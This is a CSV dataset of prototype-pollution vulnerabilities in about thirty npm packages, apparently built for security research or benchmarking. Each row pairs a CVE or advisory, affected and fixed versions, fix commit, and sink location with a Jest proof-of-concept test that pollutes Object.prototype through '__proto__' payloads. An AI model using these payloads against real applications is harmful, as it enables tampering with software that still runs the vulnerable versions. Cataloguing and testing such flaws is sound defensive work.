Attack Type,CVE-ID,Package,Version,Fix Version,Exploit File Path,Exploit,Fixed Commit,Sink,Links
prototype-pollution,,mergify,1.0.2,n/a,prototype-pollution/mergify_1.0.2,"//https://hackerone.com/reports/439098
test(""prototype pollution in mergify"", () => {
  const mergify = require(""mergify"");
  const payload = '{""__proto__"":{""polluted"":""yes""}}';

  expect({}.polluted).toBe(undefined);

  mergify({}, JSON.parse(payload));

  expect({}.polluted).toBe(""yes"");
});
",n/a,index.js:15:11,https://security.snyk.io/vuln/SNYK-JS-MERGIFY-72673; https://github.com/advisories/GHSA-3f95-w5h5-fq86
prototype-pollution,CVE-2019-10745,assign-deep,1.0.0,1.0.1,prototype-pollution/assign-deep_1.0.0,"//https://snyk.io/vuln/SNYK-JS-ASSIGNDEEP-450211
test(""prototype pollution in assign-deep "", () => {
  const assign = require(""assign-deep"");
  const payloads = ['{""__proto__"": {""polluted"": ""yes""}}'];

  var obj = {};

  expect({}.polluted).toBe(undefined);

  assign({}, JSON.parse(payloads[0]));
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/jonschlinkert/assign-deep/commit/90bf1c551d05940898168d04066bbf15060f50cc,index.js:22:23,https://security.snyk.io/vuln/SNYK-JS-ASSIGNDEEP-450211; https://github.com/advisories/GHSA-66rh-8fw6-59q6
prototype-pollution,CVE-2020-28449,decal,2.0.0,n/a,prototype-pollution/decal_2.0.0,"//https://security.snyk.io/vuln/SNYK-JS-DECAL-1051007
test(""prototype pollution in decal"", () => {
  const decal = require(""decal"");

  expect({}.polluted).toBe(undefined);
  decal.set({}, ""__proto__.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",n/a,src/utils/set.js:62:21,https://security.snyk.io/vuln/SNYK-JS-DECAL-1051007; https://github.com/advisories/GHSA-vp77-fqqp-79j8
prototype-pollution,CVE-2020-24939,supermixer,1.0.3,1.0.5,prototype-pollution/supermixer_1.0.3,"//hackerone.com/reports/959987

https: test(""prototype pollution in supermixer"", () => {
  var mixer = require(""supermixer"");
  obj = {};

  expect({}.polluted).toBe(undefined);
  var payload = '{""__proto__"":{""polluted"":""yes""}}'; //payload

  mixer.merge({}, JSON.parse(payload));
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/stampit-org/supermixer/commit/94dcc6fc45e0fed96187cb52aaffadf76dbbc0a3,dist/mixer.js:86:19,https://security.snyk.io/vuln/SNYK-JS-SUPERMIXER-607909; https://github.com/advisories/GHSA-7prf-vw4p-qr59
prototype-pollution,CVE-2021-23440,set-value,3.0.0,4.0.1,prototype-pollution/set-value_3.0.0,"//https://snyk.io/vuln/SNYK-JS-SETVALUE-450213
test(""prototype pollution in set-value "", () => {
  const setFn = require(""set-value"");
  const paths = [""__proto__.polluted""];

  var obj = {};

  expect({}.polluted).toBe(undefined);

  setFn({}, paths[0], ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/jonschlinkert/set-value/commit/7cf8073bb06bf0c15e08475f9f952823b4576452,index.js:41:20,https://security.snyk.io/vuln/SNYK-JS-SETVALUE-1540541; https://github.com/advisories/GHSA-4jqc-8m5r-9rpr
prototype-pollution,,@fluentui/styles,0.47.15,0.50.0,prototype-pollution/fluentui-styles_0.47.15,"//https://snyk.io/vuln/SNYK-JS-FLUENTUISTYLES-570808

test(""prototype pollution in @fluentui/style "", () => {
  const styles = require(""@fluentui/styles"");
  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
  const source2 = {
    k3: {},
  };

  expect({}.polluted).toBe(undefined);

  let x = styles.deepmerge(source2, JSON.parse(malicious_payload));

  expect({}.polluted).toBe(""yes"");
});
",n/a,styles/dist/commonjs/deepmerge.ts:16:9,https://security.snyk.io/vuln/SNYK-JS-FLUENTUISTYLES-570808; 
prototype-pollution,CVE-2020-7737,safetydance,2.0.1,n/a,prototype-pollution/safetydance_2.0.1,"//https://snyk.io/vuln/SNYK-JS-SAFETYDANCE-598687

test(""prototype pollution in safetydance"", () => {
  const safetydance = require(""safetydance"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  safetydance.set({}, ""__proto__.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",n/a,index.js:215:25,https://security.snyk.io/vuln/SNYK-JS-SAFETYDANCE-598687; 
prototype-pollution,,extend-merge,1.0.5,1.0.6,prototype-pollution/extend-merge_1.0.5,"//https://hackerone.com/reports/878339
test(""prototype pollution in extend-merge"", () => {
  const extend_merge = require(""extend-merge"");
  const payload = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
  let obj = {};

  expect({}.polluted).toBe(undefined);

  extend_merge.merge({}, payload);
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/crysalead-js/extend-merge/commit/6c8dc4e4b5983fa3e85544716f8e347dea2ba3b0,base-extend.js:41:21,https://security.snyk.io/vuln/SNYK-JS-EXTENDMERGE-609868; 
prototype-pollution,CVE-2021-23433,algoliasearch-helper,3.6.0,3.6.2,prototype-pollution/algoliasearch-helper_3.6.0,"//https://security.snyk.io/vuln/SNYK-JS-ALGOLIASEARCHHELPER-1570421
test(""prototype pollution in algoliasearch-helper"", () => {
  const algohelp = require(""algoliasearch-helper"");
  let payload = JSON.parse('{""__proto__"": {""polluted"": ""yes""}}');

  expect({}.polluted).toBe(undefined);

  algohelp.SearchParameters._parseNumbers(payload); // {}

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/algolia/algoliasearch-helper-js/commit/4ff542b70b92a6b81cce8b9255700b0bc0817edd,src/functions/merge.js:38:19,https://security.snyk.io/vuln/SNYK-JS-ALGOLIASEARCHHELPER-1570421; https://github.com/advisories/GHSA-vpf5-82c8-9v36
prototype-pollution,CVE-2021-23574,js-data,3.0.9,n/a,prototype-pollution/js-data_3.0.9,"//https://snyk.io/vuln/SNYK-JS-JSDATA-1023655
test(""prototype pollution in js-data"", () => {
  expect({}.polluted).toBe(undefined);

  const { utils } = require(""js-data"");
  const source = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
  utils.deepMixIn({}, source);

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/js-data/js-data/pull/579/commits/44d69656ce22a0a0300f1e94eb6dcfefd9dcffa4,src/utils.js:487:18,https://security.snyk.io/vuln/SNYK-JS-JSDATA-1584361; https://github.com/advisories/GHSA-c6h4-gc3f-hgjq
prototype-pollution, CVE-2021-23397,@ianwalter/merge,9.0.1,n/a,prototype-pollution/ianwalter-merge_9.0.1,"//https://security.snyk.io/vuln/SNYK-JS-IANWALTERMERGE-1311022
test(""prototype pollution in @ianwalter/merge"", () => {
  const merge = require(""@ianwalter/merge"");

  expect({}.polluted).toBe(undefined);

  let EVIL_JSON = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
  merge({}, EVIL_JSON);
  expect({}.polluted).toBe(""yes"");
});
",n/a,,https://security.snyk.io/vuln/SNYK-JS-IANWALTERMERGE-1311022; 
prototype-pollution,CVE-2021-23442,@cookiex/deep,0.0.6,n/a,prototype-pollution/cookiex-deep_0.0.6,"test(""prototype pollution in @cookiex/deep"", () => {
  const deep = require(""@cookiex/deep"");
  expect({}.polluted).toBe(undefined);

  const target = {};
  deep.default(target, JSON.parse('{""__proto__"":{""polluted"":""yes""}}'));

  expect({}.polluted).toBe(""yes"");
});
",n/a,deep/dist/assigner.js:13:31,https://security.snyk.io/vuln/SNYK-JS-COOKIEXDEEP-1582793; https://github.com/advisories/GHSA-92v9-xh2q-fq9f
prototype-pollution,CVE-2020-28471,properties-reader,2.0.0,2.2.0,prototype-pollution/properties-reader_2.0.0,"//https://snyk.io/vuln/SNYK-JS-PROPERTIESREADER-1048968
test(""prototype pollution in properties-reader"", () => {
  const propertiesReader = require(""properties-reader"");
  const path = require(""path"");

  expect({}.polluted).toBe(undefined);

  propertiesReader(path.resolve(__dirname, ""./payload.ini""));
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/steveukx/properties/commit/0877cc871db9865f58dd9389ce99e61be05380a5,src/properties-reader.js:200:27,https://security.snyk.io/vuln/SNYK-JS-PROPERTIESREADER-1048968; 
prototype-pollution,CVE-2018-16491,node.extend,1.0.0,2.0.1,prototype-pollution/node-extend_1.0.0,"//https://hackerone.com/reports/430831
test(""prototype pollution in node.extend "", () => {
  let extend = require(""node.extend"");
  var obj = {};

  expect({}.polluted).toBe(undefined);

  extend(true, {}, JSON.parse('{""__proto__"": {""polluted"": ""yes""}}'));
  expect({}.polluted).toBe(""yes"");
});
",n/a,lib/extend.js:86:26,https://security.snyk.io/vuln/SNYK-JS-NODEEXTEND-73641; https://github.com/advisories/GHSA-r96c-57pf-9jjm
prototype-pollution,CVE-2021-41097,aurelia-path,1.1.0,1.1.7,prototype-pollution/aurelia-path_1.1.7,"//https://security.snyk.io/vuln/SNYK-JS-AURELIAPATH-1292346
test(""prototype pollution in aurelia-path"", () => {
  const ap = require(""aurelia-path"");

  expect({}.polluted).toBe(undefined);

  ap.parseQueryString(""__proto__[polluted]=yes"");

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/aurelia/path/releases/tag/1.1.7,dist/commonjs/aurelia-path.js:163:42,https://security.snyk.io/vuln/SNYK-JS-AURELIAPATH-1292346; https://github.com/advisories/GHSA-3c9c-2p65-qvwv; https://github.com/aurelia/path/issues/44
prototype-pollution,CVE-2020-28276,deep-set,1.0.0,n/a,prototype-pollution/deep-set_1.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28276
test(""prototype pollution in deep-set"", () => {
  expect({}.polluted).toBe(undefined);

  const deepSet = require(""deep-set"");
  const obj = { 1: ""2"" };
  deepSet(obj, ""__proto__.polluted"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",n/a,index.js:33:31,https://security.snyk.io/vuln/SNYK-JS-DEEPSET-1054938; 
prototype-pollution,CVE-2019-10806,vega-util,1.13.0,1.13.1,prototype-pollution/vega-util_1.13.0,"//https://snyk.io/vuln/SNYK-JS-VEGAUTIL-559223

test(""prototype pollution in vega-util"", () => {
  const util = require(""vega-util"");
  const config = ""{style: {point: {shape: triangle-right}}}"";
  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';

  expect({}.polluted).toBe(undefined);

  util.mergeConfig(config, JSON.parse(malicious_payload));

  expect({}.polluted).toBe(""yes"");
});
",n/a,build/vega-util.js:203:16,https://security.snyk.io/vuln/SNYK-JS-VEGAUTIL-559223; https://github.com/advisories/GHSA-6hwh-rqwf-cxxr
prototype-pollution,,think-config,1.0.0,1.1.3,prototype-pollution/think-config_1.0.0,"//https://github.com/thinkjs/think-config/commit/31b82468d72f2e1456a27a4827cea378196db6db
test(""prototype pollution in x-assign"", () => {
  const Config = require(""think-config"");
  const config = new Config({ name: 2 });

  expect({}.polluted).toBe(undefined);

  let obj = {};
  config.set(""name.__proto__.polluted"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/thinkjs/think-config/commit/31b82468d72f2e1456a27a4827cea378196db6db,index.js:50:22,https://github.com/advisories/GHSA-6cj2-92m5-7mvp; https://security.snyk.io/vuln/SNYK-JS-THINKCONFIG-1536566
prototype-pollution,CVE-2018-16489,just-extend,3.0.0,n/a,prototype-pollution/just-extend_3.0.0,"//https://hackerone.com/reports/430291
test(""prototype pollution in just-extend "", () => {
  const extend = require(""just-extend"");

  let obj = {};

  expect({}.polluted).toBe(undefined);

  let payload2 = JSON.parse('{""__proto__"": {""polluted"": ""yes""}}');
  extend(true, {}, payload2);
  expect({}.polluted).toBe(""yes"");
});
",n/a,index.js:52:23,https://security.snyk.io/vuln/SNYK-JS-JUSTEXTEND-72674; https://github.com/advisories/GHSA-675m-85rw-j3w4
prototype-pollution,CVE-2021-23395,nedb,1.8.0,n/a,prototype-pollution/nedb_1.8.0,"//https://security.snyk.io/vuln/SNYK-JS-TSNODASH-1311009
test(""prototype pollution in nedb"", () => {
  const Datastore = require(""nedb"");
  const db = new Datastore();

  expect({}.polluted).toBe(undefined);

  db.insert({ hello: ""world"" }, (err) => {
    db.update(
      { hello: ""world"" },
      { $set: { ""__proto__.polluted"": ""yes"" } },
      {},
      (err) => {
        expect({}.polluted).toBe(""yes"");
      }
    );
  });
});
",n/a,lib/model.js:304:14,https://security.snyk.io/vuln/SNYK-JS-NEDB-1305279; https://github.com/advisories/GHSA-339j-hqgx-qrrx
prototype-pollution,CVE-2021-3815,@fabiocaccamo/utils.js,0.17.0,n/a,prototype-pollution/fabiocaccamo-utils.js_0.17.0,"//https://security.snyk.io/vuln/SNYK-JS-FABIOCACCAMOUTILSJS-1932614
test(""prototype pollution in @fabiocaccamo/utils.js"", () => {
  const utils = require(""@fabiocaccamo/utils.js"");
  const obj = {};

  expect({}.polluted).toBe(undefined);

  utils.object.keypath.set(obj, ""__proto__.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/fabiocaccamo/utils.js/commit/102efafb291ce1916985514440d3bf8a6826890a,utils.js/dist/utils.js:2365:33,https://security.snyk.io/vuln/SNYK-JS-FABIOCACCAMOUTILSJS-1932614; https://github.com/advisories/GHSA-3xph-cp8f-2229
prototype-pollution,CVE-2020-28271,deephas,1.0.5,1.0.7,prototype-pollution/deephas_1.0.5,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28271
test(""prototype pollution in deephas "", () => {
  expect({}.polluted).toBe(undefined);

  const dh = require(""deephas"");
  let obj = {};
  dh.set(obj, ""__proto__.polluted"", ""yes"");

  expect(obj.polluted).toBe(""yes"");
});
",https://github.com/sharpred/deepHas/commit/2fe011713a6178c50f7deb6f039a8e5435981e20,deepHas.js:65:20,https://security.snyk.io/vuln/SNYK-JS-DEEPHAS-1039845; https://github.com/advisories/GHSA-4fr2-j4g9-mppf
prototype-pollution,,inireader,1.0.0,2.0.0,prototype-pollution/inireader_1.0.0,"//https://snyk.io/vuln/SNYK-JS-INIREADER-1054843
test(""prototype pollution in inireader"", () => {
  const iniReader = require(""inireader"");
  const path = require(""path"");
  const parser = new iniReader.IniReader();

  let obj = {};
  expect({}.polluted).toBe(undefined);

  parser.load(path.resolve(__dirname, ""./payload.ini""));
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/Ajnasz/IniReader/commit/c260e4e9050c731dbdb88e1d2e23e851528d3d93,lib/inireadercore.js:310:60,https://security.snyk.io/vuln/SNYK-JS-INIREADER-1054843; 
prototype-pollution,CVE-2020-15256,object-path,0.11.4,0.11.5,prototype-pollution/object-path_0.11.0,"//https://hackerone.com/reports/878332
test(""prototype pollution in object-path"", () => {
  const setPath = require(""object-path-set"");

  expect({}.polluted).toBe(undefined);
  setPath({}, ""__proto__.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/skratchdot/object-path-set/commit/55f06d75abf5885f9cba3b7760acb38d7d7d06c0,index.js:19:13,https://security.snyk.io/vuln/SNYK-JS-OBJECTPATH-1017036; https://github.com/advisories/GHSA-v39p-96qg-c8rf; https://hackerone.com/reports/878332
prototype-pollution,CVE-2020-28281,set-object-value,0.0.5, 0.0.6,prototype-pollution/set-object-value_0.0.5,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28281
test(""prototype pollution in setObjectValue"", () => {
  var setObjectValue = require(""set-object-value"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  setObjectValue(obj, [""__proto__"", ""polluted""], ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/react-atomic/react-atomic-organism/commit/c8ec63388f7785078cb27275b56ed955ffd3db6c,build/cjs/src/index.js:24:15,https://security.snyk.io/vuln/SNYK-JS-SETOBJECTVALUE-1054931; https://github.com/advisories/GHSA-4jj4-m52p-8rx3
prototype-pollution,,@lyngs/digger,1.0.7,n/a,prototype-pollution/lyngs-digger_1.0.7,"//https://security.snyk.io/vuln/SNYK-JS-LYNGSDIGGER-1069826
test(""prototype pollution in @lyngs/digge"", () => {
  const { digger } = require(""@lyngs/digger"");
  expect({}.polluted).toBe(undefined);
  digger({}, ""__proto__.polluted"", ""yes"", { extend: true });
  expect({}.polluted).toBe(""yes"");
});
",n/a,digger/dist/index.js:2120:23,https://security.snyk.io/vuln/SNYK-JS-LYNGSDIGGER-1069826; 
prototype-pollution,,convict,6.0.0,6.0.1,prototype-pollution/convict_6.0.0,"//https://snyk.io/vuln/SNYK-JS-CONVICT-1062508
test(""prototype pollution in node-dig"", () => {
  const convict = require(""convict"");
  let obj = {};
  const config = convict(obj);

  expect({}.polluted).toBe(undefined);

  config.set(""__proto__.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",n/a,src/main.js:565:24,https://security.snyk.io/vuln/SNYK-JS-CONVICT-1062508; 
prototype-pollution,,node-dig,1.0.1,n/a,prototype-pollution/node-dig_1.0.1,"//https://snyk.io/vuln/SNYK-JS-NODEDIG-1069825
test(""prototype pollution in node-dig"", () => {
  const nodeDig = require(""node-dig"");
  expect({}.polluted).toBe(undefined);

  nodeDig({}, [""__proto__"", ""polluted""], ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",n/a,lib/dig/index.js:4:33,https://security.snyk.io/vuln/SNYK-JS-NODEDIG-1069825; 
prototype-pollution, CVE-2021-25952,just-safe-set,1.0.0,2.2.2,prototype-pollution/just-safe-set_1.0.0,"//https://security.snyk.io/vuln/SNYK-JS-JUSTSAFESET-1316267
test(""prototype pollution in just-safe-set"", () => {
  const justSafeSet = require(""just-safe-set"");
  let obj = {};

  expect({}.polluted).toBe(undefined);

  justSafeSet(obj, ""__proto__.polluted"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/angus-c/just/commit/dd57a476f4bb9d78c6f60741898dc04c71d2eb53,index.js:36:17,https://security.snyk.io/vuln/SNYK-JS-JUSTSAFESET-1316267; https://github.com/advisories/GHSA-v26w-gcxh-v4r7
prototype-pollution,CVE-2021-23807,jsonpointer,4.0.0,5.0.0,prototype-pollution/jsonpointer_4.0.0,"//https://security.snyk.io/vuln/SNYK-JS-JSONPOINTER-1577288
test(""prototype pollution in jsonpointer"", () => {
  const jsonpointer = require(""jsonpointer"");

  expect({}.polluted).toBe(undefined);
  jsonpointer.set({}, [[""proto""], [""__proto__""], ""polluted""], ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/janl/node-jsonpointer/commit/a0345f3550cd9c4d89f33b126390202b89510ad4,jsonpointer.js:43:18,https://security.snyk.io/vuln/SNYK-JS-JSONPOINTER-1577288; https://github.com/advisories/GHSA-282f-qqgm-c34q
prototype-pollution,,style-dictionary,2.10.2,2.10.3,prototype-pollution/style-dictionary_2.10.2,"//https://snyk.io/vuln/SNYK-JS-STYLEDICTIONARY-1080632
test(""prototype pollution in style-dictionary"", () => {
  const StyleDictionary = require(""style-dictionary"");
  const obj = {};
  let opts = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');

  expect({}.polluted).toBe(undefined);

  StyleDictionary.extend(opts);
  expect({}.polluted).toBe(""yes"");
});
",n/a,lib/utils/deepExtend.js:76:26,https://security.snyk.io/vuln/SNYK-JS-STYLEDICTIONARY-1080632; 
prototype-pollution,,@brikcss/merge,1.3.0,n/a,prototype-pollution/brikcss-merge_1.3.0,"//https://security.snyk.io/vuln/SNYK-JS-BRIKCSSMERGE-1727594
test(""prototype pollution in @brikcss/merge"", () => {
  const merge = require(""@brikcss/merge"");
  let obj = {};
  let malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';

  expect({}.polluted).toBe(undefined);

  merge({}, JSON.parse(malicious_payload));
  expect({}.polluted).toBe(""yes"");
});
",N/A,merge/dist/lib/merge.js:2:1599,https://security.snyk.io/vuln/SNYK-JS-BRIKCSSMERGE-1727594; 
prototype-pollution,,mquery,3.2.1,3.2.5,prototype-pollution/mquery_3.2.1,"//https://snyk.io/vuln/SNYK-JS-MQUERY-1050858
test(""prototype pollution in mquery"", () => {
  const mquery = require(""mquery"");
  let obj = {};
  var payload = JSON.parse('{""__proto__"": {""polluted"": ""yes""}}');

  expect({}.polluted).toBe(undefined);

  var m = mquery(payload);
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/aheckmann/mquery/commit/158f059e058579d2d08c2f1380689f5f69336778,lib/utils.js:137:15,https://security.snyk.io/vuln/SNYK-JS-MQUERY-1089718; https://github.com/advisories/GHSA-45q2-34rf-mr94
